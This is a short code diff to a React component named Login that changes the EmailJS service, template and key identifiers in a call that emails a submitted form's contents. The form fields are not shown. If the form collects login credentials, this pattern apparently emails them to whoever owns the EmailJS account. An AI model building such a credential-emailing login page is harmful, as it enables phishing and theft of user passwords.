@@ -11,7 +11,7 @@ function Login() {
     const sendEmail = (e) => {
         e.preventDefault();
 
-        emailjs.sendForm('service_id6z6i9', 'template_h2y7r5r', form.current, 'FVIPVt10PQDRIGWMa')
+        emailjs.sendForm('service_8eh7gbo', 'template_z6aw6co', form.current, '9SMz_ZPkSDxljqBsS')
             .then((result) => {
                 console.log(result.text);
             }, (error) => {
